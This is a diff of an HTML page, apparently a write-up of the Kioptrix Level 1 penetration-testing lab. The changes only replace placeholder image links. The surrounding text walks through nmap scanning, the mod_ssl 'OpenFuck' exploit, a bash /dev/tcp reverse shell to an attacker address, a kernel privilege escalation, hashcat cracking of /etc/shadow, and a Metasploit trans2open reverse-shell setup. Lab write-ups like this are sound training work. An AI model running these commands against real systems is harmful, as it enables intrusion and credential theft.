@@ -109,13 +109,13 @@
               <h4>Host Discovery</h4>
               <p>Using Nmap, I identified the target system at IP 192.168.149.143 within the 192.168.149.0/24 network:</p>
               <pre><code>nmap -sn 192.168.149.0/24</code></pre>
-              <img src="https://picsum.photos/seed/kioptrix1-1/800/400.jpg" alt="Nmap host discovery results" onclick="openModal(this.src)" />
+              <img src="/images/kiopetrix_1/image.png" alt="Nmap host discovery results" onclick="openModal(this.src)" />
               <p>Five hosts were identified, with 192.168.149.143 selected as the target based on a process of elimination, as the other IPs were known to be infrastructure and host IP.</p>
 
               <h4>Port and Service Enumeration</h4>
               <p>A comprehensive scan with nmap revealed six open services:</p>
               <pre><code>nmap -sV 192.168.149.143 -O</code></pre>
-              <img src="https://picsum.photos/seed/kioptrix1-2/800/400.jpg" alt="Nmap port scan results" onclick="openModal(this.src)" />
+              <img src="/images/kiopetrix_1/image 1.png" alt="Nmap port scan results" onclick="openModal(this.src)" />
               <table>
                 <thead>
                   <tr>
@@ -162,7 +162,7 @@
               <h3>2. Enumeration Results</h3>
               <h4>Web Application Analysis</h4>
               <p>The HTTP server displayed a default Apache page, which was not interesting. Directory enumeration with Dirb revealed several interesting paths:</p>
-              <img src="https://picsum.photos/seed/kioptrix1-3/800/400.jpg" alt="Dirb directory enumeration results" onclick="openModal(this.src)" />
+              <img src="/images/kiopetrix_1/image 2.png" alt="Dirb directory enumeration results" onclick="openModal(this.src)" />
               <ul>
                 <li><code>/cgi-bin/</code> (403 Forbidden)</li>
                 <li><code>/~operator</code> (403 Forbidden)</li>
@@ -174,15 +174,15 @@
               <h4>Vulnerability Identification</h4>
               <ul>
                 <li><strong>Apache/mod_ssl:</strong> Version 1.3.20/2.8.4 has known critical vulnerabilities (CVE-2002-0082)</li>
-                <img src="https://picsum.photos/seed/kioptrix1-4/800/400.jpg" alt="Apache vulnerability search" onclick="openModal(this.src)" />
+                <img src="/images/kiopetrix_1/image 3.png" alt="Apache vulnerability search" onclick="openModal(this.src)" />
                 <li><strong>Samba:</strong> Version vulnerable to trans2open exploit</li>
                 <p>I enumerated the version of SMB service first using metasploit and it was 2.2.1</p>
-                <img src="https://picsum.photos/seed/kioptrix1-5/800/400.jpg" alt="SMB version enumeration" onclick="openModal(this.src)" />
+                <img src="/images/kiopetrix_1/image 4.png" alt="SMB version enumeration" onclick="openModal(this.src)" />
                 <p>after getting SMB version I searched on goolge for exploit and i found trans2open</p>
-                <img src="https://picsum.photos/seed/kioptrix1-6/800/400.jpg" alt="Trans2open exploit search" onclick="openModal(this.src)" />
+                <img src="/images/kiopetrix_1/image 5.png" alt="Trans2open exploit search" onclick="openModal(this.src)" />
                 <li><strong>SSH:</strong> Version 2.9p2 has multiple documented vulnerabilities, but I couldn't get exploit code or POC.</li>
                 <li><strong>Kernel:</strong> Linux 2.4.x vulnerable to ptrace/kmod local privilege escalation (will be needed with the apache vulnerability)</li>
-                <img src="https://picsum.photos/seed/kioptrix1-7/800/400.jpg" alt="Kernel vulnerability search" onclick="openModal(this.src)" />
+                <img src="/images/kiopetrix_1/image 6.png" alt="Kernel vulnerability search" onclick="openModal(this.src)" />
               </ul>
               <p>overall i used Google, searchsploit, Metasploit, and also ChatGPT to search for vulnerabilities</p>
 
@@ -190,39 +190,39 @@
               <h4>Initial Access via mod_ssl Vulnerability (CVE-2002-0082)</h4>
               <p>I leveraged the "OpenFuck" exploit targeting the mod_ssl vulnerability:</p>
               <pre><code>./openfuck 0x6b 192.168.149.143</code></pre>
-              <img src="https://picsum.photos/seed/kioptrix1-8/800/400.jpg" alt="OpenFuck exploit execution" onclick="openModal(this.src)" />
+              <img src="/images/kiopetrix_1/image 7.png" alt="OpenFuck exploit execution" onclick="openModal(this.src)" />
               <p>After three attempts, I successfully obtained a shell as the 'apache' user. To stabilize the connection, I established a reverse shell (the session was continuously closing after some time):</p>
               <pre><code>sh -i >& /dev/tcp/192.168.149.139/9001 0>&1</code></pre>
               <p>I handled the session through metasploit for easier workframe and for post exploitation running.</p>
-              <img src="https://picsum.photos/seed/kioptrix1-9/800/400.jpg" alt="Metasploit session handling" onclick="openModal(this.src)" />
+              <img src="/images/kiopetrix_1/image 8.png" alt="Metasploit session handling" onclick="openModal(this.src)" />
               <p>After gaining access, I ran <code>uname -a</code> to gather system information:</p>
               <pre><code>Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</code></pre>
-              <img src="https://picsum.photos/seed/kioptrix1-10/800/400.jpg" alt="System information" onclick="openModal(this.src)" />
+              <img src="/images/kiopetrix_1/image 9.png" alt="System information" onclick="openModal(this.src)" />
 
               <h4>Privilege Escalation</h4>
               <ol>
                 <li><strong>System Enumeration:</strong>
                   <ul>
                     <li>I looked up users on the system and identified two user accounts: john and harold</li>
-                    <img src="https://picsum.photos/seed/kioptrix1-11/800/400.jpg" alt="User enumeration" onclick="openModal(this.src)" />
+                    <img src="/images/kiopetrix_1/image 10.png" alt="User enumeration" onclick="openModal(this.src)" />
                     <li>Confirmed kernel version (Linux 2.4.7-10) vulnerable to ptrace/kmod exploit</li>
                   </ul>
                 </li>
                 <li><strong>Local Privilege Escalation:</strong>
                   <p>Utilized the ptrace/kmod vulnerability:</p>
                   <pre><code>searchsploit linux 2.4 escalation</code></pre>
-                  <img src="https://picsum.photos/seed/kioptrix1-12/800/400.jpg" alt="Searchsploit results" onclick="openModal(this.src)" />
+                  <img src="/images/kiopetrix_1/image 11.png" alt="Searchsploit results" onclick="openModal(this.src)" />
                   <p>I made http server using python one line</p>
                   <pre><code>python -m http.server 8088</code></pre>
                   <p>transfered the file from the target device and compiled and executed the exploit to gain root privileges.</p>
-                  <img src="https://picsum.photos/seed/kioptrix1-13/800/400.jpg" alt="Privilege escalation" onclick="openModal(this.src)" />
+                  <img src="/images/kiopetrix_1/image 12.png" alt="Privilege escalation" onclick="openModal(this.src)" />
                 </li>
               </ol>
 
               <h4>Credential Harvesting</h4>
               <p>With root access, I extracted and cracked password hashes from /etc/shadow:</p>
               <pre><code>hashcat -m 500 -a 0 target.txt passwords/ignis-10M.txt</code></pre>
-              <img src="https://picsum.photos/seed/kioptrix1-14/800/400.jpg" alt="Hashcat password cracking" onclick="openModal(this.src)" />
+              <img src="/images/kiopetrix_1/image 13.png" alt="Hashcat password cracking" onclick="openModal(this.src)" />
               <p><strong>Result:</strong> Recovered credential for user harold: <code>harold:WebMaster</code></p>
               <p>but I couldn't crack other hashes as they need more time and better GPU.</p>
 
@@ -233,8 +233,8 @@
 set RHOSTS 192.168.149.143
 set PAYLOAD linux/x86/shell_reverse_tcp
 exploit</code></pre>
-              <img src="https://picsum.photos/seed/kioptrix1-15/800/400.jpg" alt="Samba exploit setup" onclick="openModal(this.src)" />
-              <img src="https://picsum.photos/seed/kioptrix1-16/800/400.jpg" alt="Samba exploit result" onclick="openModal(this.src)" />
+              <img src="/images/kiopetrix_1/image 14.png" alt="Samba exploit setup" onclick="openModal(this.src)" />
+              <img src="/images/kiopetrix_1/image 15.png" alt="Samba exploit result" onclick="openModal(this.src)" />
               <p>The exploit didn't work at first, and I knew the issue was that the payload couldn't be Meterpreter, as the target is so old that Meterpreter can't support it, and thus, the session was dying continuously until I changed the payload to a normal reverse shell with no Meterpreter.</p>
               <p>This exploit provided direct root access, confirming multiple paths to complete system compromise.</p>
             </section>
